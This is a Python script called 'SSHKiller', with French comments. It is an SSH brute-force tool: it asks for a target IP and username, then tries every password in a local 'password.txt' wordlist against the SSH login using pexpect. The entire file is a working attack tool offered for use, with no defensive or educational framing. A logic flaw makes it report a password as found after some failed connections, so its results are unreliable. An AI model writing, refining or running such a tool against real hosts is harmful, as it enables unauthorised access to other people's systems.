#!/usr/bin/python3.9

import pexpect
import os
from termcolor import colored

prompt = "SSHKILLER ~|==> " #Prompt du script
prompt_ssh = ["# ", ">>> ", "> ", "\$ "]

def envoiCommande(connexion, commande):
    	#Connexion = Child
	connexion.sendline(commande) #Envoie de commande
	connexion.expect(prompt_ssh)
	print(connexion.before) #Print du résultat de commande

def connect(user,host,password):
	ssh_newkey = 'Are you sure you want to continue connecting' #String toujours présent au début de connexion
	command_ssh = 'ssh ' + user + '@' + host #Commande pour se connecter SSH
	child = pexpect.spawn(command_ssh) #Envoi de la commande

	#retour = 0 ou 1 (Si connexion réussie ou non)
	retour = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])

	if retour == 0: #Première connexion échouée
		print(colored(prompt + " Une erreur est survenue lors de la connexion.", 'red'))
		return
	if retour == 1:
		child.sendline('yes') #La réponse de gngngn newkey ou pas
		retour = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])

		if retour == 0: #Après le "yes", la connexion échoue
			print(colored(prompt + " Une erreur est survenue lors de la connexion.\n",'red'))
			return

	child.sendline(password) #Ecriture du mot de passe
	child.expect(prompt_ssh, timeout = 0.3) #Timeout
	return child #On retourne la connexion

def main():
	host = input(prompt+"Entrez l'IP: ")
	user = input(prompt+"Entrez l'USER: ")
	try:
		fichierMDP = open("password.txt", "r")
	except:
		print(colored("[ERREUR] La wordlist 'password.txt' n'a pas été trouvée dans le même dossier que SSHKiller.py !","red"))
		exit(0)

	print("\n")
	#Essai de chaque mdp
	for mdp in fichierMDP.readlines():
		mdp = mdp.strip("\n")
		print(colored(prompt+"Essai du mot de passe " + mdp + "...", 'yellow'))
		try:
			child = connect(user,host,mdp)
			print(colored(prompt+"MOT DE PASSE TROUVE ! "+ mdp, 'green'))
		except: #Mot de passe incorrect
			pass

	print("\n") #Fin programme

os.system("clear")
print(colored("  ██████   ██████  ██░ ██  ██ ▄█▀ ██▓ ██▓     ██▓    ▓█████  ██▀███\n"+
            "▒██    ▒ ▒██    ▒ ▓██░ ██▒ ██▄█▒ ▓██▒▓██▒    ▓██▒    ▓█   ▀ ▓██ ▒ ██▒\n"+
            "░ ▓██▄   ░ ▓██▄   ▒██▀▀██░▓███▄░ ▒██▒▒██░    ▒██░    ▒███   ▓██ ░▄█ ▒\n"+
            "  ▒   ██▒  ▒   ██▒░▓█ ░██ ▓██ █▄ ░██░▒██░    ▒██░    ▒▓█  ▄ ▒██▀▀█▄\n"+
            "▒██████▒▒▒██████▒▒░▓█▒░██▓▒██▒ █▄░██░░██████▒░██████▒░▒████▒░██▓ ▒██▒\n"+
            " ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░▓  ░ ▒░▓  ░░ ▒░▓  ░░░ ▒░ ░░ ▒▓ ░▒▓░\n"+
           "░ ░▒  ░ ░░ ░▒  ░ ░ ▒ ░▒░ ░░ ░▒ ▒░ ▒ ░░ ░ ▒  ░░ ░ ▒  ░ ░ ░  ░  ░▒ ░ ▒░\n"+
            " ░  ░  ░  ░  ░  ░   ░  ░░ ░░ ░░ ░  ▒ ░  ░ ░     ░ ░      ░     ░░   ░\n"+
            "░        ░   ░  ░  ░░  ░    ░      ░  ░    ░  ░   ░  ░   ░\n", 'red'))

print(colored("\t\tSSH Bruteforcing ~ By b64-Sm9yZGFuIExBSVJFUw", 'yellow'))
print(colored("\t       [!] NE FONCTIONNE PAS SOUS WINDOWS [!]\n\n", "red"))
main()
